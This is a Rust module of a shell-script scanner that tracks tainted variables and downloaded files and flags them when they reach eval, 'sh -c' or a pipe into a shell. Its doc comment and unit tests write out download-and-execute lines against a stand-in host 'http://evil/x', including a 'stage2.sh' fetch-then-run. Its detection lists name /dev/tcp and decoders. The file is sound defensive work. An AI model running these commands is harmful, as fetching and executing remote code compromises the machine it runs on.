//! T1.3 dataflow taint: untrusted input reaching an execution sink.
//!
//! Many payloads split the fetch and the execution across two statements to
//! dodge the single-line `curl … | sh` rule:
//!
//! ```sh
//! payload="$(curl -s http://evil/x)"
//! eval "$payload"
//! ```
//!
//! Neither line is damning on its own. This pass connects them: a variable
//! assigned from a *taint source* (a downloader, `printenv`/`env`, or a decode
//! of attacker-controlled data) becomes tainted, and if that variable is later
//! expanded inside an *execution sink* (`eval`, `sh -c`, `bash -c`, `source`,
//! or a pipe into a shell) it raises **`TAINTED_EXEC` (Critical)**.
//!
//! The analysis is intentionally shallow (assignment + later expansion, no
//! scoping) so it stays fast and dependency-free; it complements the AST pass
//! in [`crate::astscan`] rather than replacing it.

use crate::report::{Finding, Severity};
use std::collections::HashSet;

/// Commands whose output is attacker-controlled when captured into a variable.
const TAINT_SOURCES: &[&str] = &[
    "curl ",
    "wget ",
    "fetch ",
    "printenv",
    "env ",
    "base64 -d",
    "base64 --decode",
    "xxd -r",
    "openssl enc -d",
    "/dev/tcp/",
];

/// Tokens that mean "execute this string" when a tainted variable flows in.
const EXEC_SINKS: &[&str] = &[
    "eval ", "eval\t", "sh -c", "bash -c", "zsh -c", "sh -s", "bash -s", "source ", ". \"", ". $",
];

/// Run the taint pass over `text`. Tracks both tainted *variables* (captured
/// from a network/decoder source) and tainted *files* (downloaded to disk),
/// flagging `TAINTED_EXEC` when either reaches an execution sink.
pub fn scan(text: &str, findings: &mut Vec<Finding>) {
    let mut tainted: HashSet<String> = HashSet::new();
    let mut tainted_files: HashSet<String> = HashSet::new();

    for (idx, raw) in text.lines().enumerate() {
        let lineno = idx + 1;
        let line = raw.trim();
        let lower = line.to_ascii_lowercase();
        if lower.is_empty() || line.starts_with('#') {
            continue;
        }

        let downloaded_here = download_target(&lower);

        // Sink check: a tainted variable expanded into an execution sink…
        if is_exec_sink(&lower) || pipes_to_shell(&lower) || herestring_to_shell(&lower) {
            if let Some(var) = tainted.iter().find(|v| references(line, v)) {
                push_exec(findings, lineno, &format!("${var}"), var);
            }
        }

        // …or a tainted file being executed / sourced (but not on the very line
        // that downloaded it).
        if downloaded_here.is_none() {
            if let Some(file) = tainted_files.iter().find(|f| executes_file(&lower, f)) {
                push_exec(findings, lineno, file, file);
            }
        }

        // Record a file freshly downloaded from the network.
        if let Some(file) = downloaded_here {
            tainted_files.insert(file);
        }

        // Propagate taint from an assignment on this line.
        if let Some((name, rhs)) = assignment(line) {
            let rhs_lower = rhs.to_ascii_lowercase();
            let from_source = TAINT_SOURCES.iter().any(|s| rhs_lower.contains(s));
            let from_var = tainted.iter().any(|v| references(rhs, v));
            let from_file = tainted_files.iter().any(|f| reads_file(&rhs_lower, f));
            if from_source || from_var || from_file {
                tainted.insert(name.to_string());
            } else {
                // Reassigned from a clean source → clears prior taint.
                tainted.remove(name);
            }
        }
    }
}

/// Push a `TAINTED_EXEC` finding for `subject` (display) / `arg`.
fn push_exec(findings: &mut Vec<Finding>, lineno: usize, subject: &str, arg: &str) {
    findings.push(
        Finding::at(
            Severity::Critical,
            "TAINTED_EXEC",
            format!("Untrusted input in {subject} reaches an execution sink"),
            lineno,
        )
        .with_arg(arg.to_string()),
    );
}

/// Filename a downloader writes to on this line (`-o`/`-O`/`--output` or a
/// redirect), if the line fetches from the network.
fn download_target(lower: &str) -> Option<String> {
    if !(lower.contains("curl ") || lower.contains("wget ") || lower.contains("fetch ")) {
        return None;
    }
    let toks: Vec<&str> = lower.split_whitespace().collect();
    for (i, t) in toks.iter().enumerate() {
        if matches!(*t, "-o" | "--output" | "--output-document") {
            if let Some(f) = toks.get(i + 1) {
                return Some(clean_file(f));
            }
        }
        if let Some(f) = t.strip_prefix("--output=") {
            return Some(clean_file(f));
        }
    }
    // Redirect form: `curl URL > file`.
    if let Some(pos) = lower.find('>') {
        let after = lower[pos + 1..].trim_start_matches('>').trim();
        if let Some(f) = after.split_whitespace().next() {
            if !f.is_empty() {
                return Some(clean_file(f));
            }
        }
    }
    None
}

/// Whether the line executes / sources `file`.
fn executes_file(lower: &str, file: &str) -> bool {
    let f = file;
    lower.contains(&format!("sh {f}"))
        || lower.contains(&format!("bash {f}"))
        || lower.contains(&format!("source {f}"))
        || lower.contains(&format!(". {f}"))
        || lower.contains(&format!("./{}", f.trim_start_matches("./")))
        || lower.contains(&format!("python {f}"))
        || lower.contains(&format!("perl {f}"))
}

/// Whether the line reads `file` into a capture (`cat file` / `< file`).
fn reads_file(lower: &str, file: &str) -> bool {
    lower.contains(&format!("cat {file}")) || lower.contains(&format!("< {file}"))
}

/// Normalize a filename token (strip quotes, leading `./`).
fn clean_file(f: &str) -> String {
    f.trim_matches(['"', '\'', '(', ')'])
        .trim_start_matches("./")
        .to_string()
}

/// Whether the line feeds a here-string (`<<<`) into a shell interpreter.
fn herestring_to_shell(lower: &str) -> bool {
    lower.contains("<<<")
        && (lower.contains("sh") || lower.contains("bash") || lower.contains("zsh"))
}

/// Parse a leading `NAME=...` assignment, returning `(name, rhs)`.
fn assignment(line: &str) -> Option<(&str, &str)> {
    let eq = line.find('=')?;
    let name = &line[..eq];
    if name.is_empty() || !name.bytes().next()?.is_ascii_alphabetic() {
        return None;
    }
    if !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
        return None;
    }
    Some((name, &line[eq + 1..]))
}

/// Whether `line` expands `$var` or `${var}`.
fn references(line: &str, var: &str) -> bool {
    let braced = format!("${{{var}}}");
    if line.contains(&braced) {
        return true;
    }
    // `$var` not followed by an identifier char (so `$payload` ≠ `$payloads`).
    let needle = format!("${var}");
    let bytes = line.as_bytes();
    let mut from = 0;
    while let Some(pos) = line[from..].find(&needle) {
        let end = from + pos + needle.len();
        let next_ok = bytes
            .get(end)
            .is_none_or(|&b| !(b.is_ascii_alphanumeric() || b == b'_'));
        if next_ok {
            return true;
        }
        from = end;
    }
    false
}

/// Whether the line is an execution sink.
fn is_exec_sink(lower: &str) -> bool {
    EXEC_SINKS.iter().any(|s| lower.contains(s))
}

/// Whether the line pipes into a shell interpreter.
fn pipes_to_shell(lower: &str) -> bool {
    lower.contains("| sh")
        || lower.contains("|sh")
        || lower.contains("| bash")
        || lower.contains("|bash")
        || lower.contains("| zsh")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fetch_then_eval_is_tainted() {
        let src = "payload=\"$(curl -s http://evil/x)\"\neval \"$payload\"\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.iter().any(|x| x.code == "TAINTED_EXEC"), "{f:?}");
    }

    #[test]
    fn taint_propagates_through_assignment() {
        let src = "a=$(wget -qO- http://x)\nb=\"$a\"\nsh -c \"$b\"\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.iter().any(|x| x.code == "TAINTED_EXEC"), "{f:?}");
    }

    #[test]
    fn clean_variable_eval_not_flagged() {
        let src = "msg=\"hello world\"\neval \"echo $msg\"\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.is_empty(), "{f:?}");
    }

    #[test]
    fn pipe_to_shell_of_tainted_var() {
        let src = "p=$(curl http://x)\necho \"$p\" | bash\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.iter().any(|x| x.code == "TAINTED_EXEC"), "{f:?}");
    }

    #[test]
    fn downloaded_file_then_executed() {
        let src = "curl -o stage2.sh http://evil/x\nbash stage2.sh\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(
            f.iter()
                .any(|x| x.code == "TAINTED_EXEC" && x.arg.as_deref() == Some("stage2.sh")),
            "{f:?}"
        );
    }

    #[test]
    fn downloaded_file_read_into_var_then_eval() {
        let src = "wget -O payload http://x\ncmd=$(cat payload)\neval \"$cmd\"\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.iter().any(|x| x.code == "TAINTED_EXEC"), "{f:?}");
    }

    #[test]
    fn herestring_of_tainted_var() {
        let src = "p=$(curl http://x)\nbash <<< \"$p\"\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.iter().any(|x| x.code == "TAINTED_EXEC"), "{f:?}");
    }

    #[test]
    fn local_file_exec_not_flagged() {
        // A file produced by the build (not downloaded) is not tainted.
        let src = "echo '#!/bin/sh' > build.sh\nbash build.sh\n";
        let mut f = Vec::new();
        scan(src, &mut f);
        assert!(f.is_empty(), "{f:?}");
    }
}
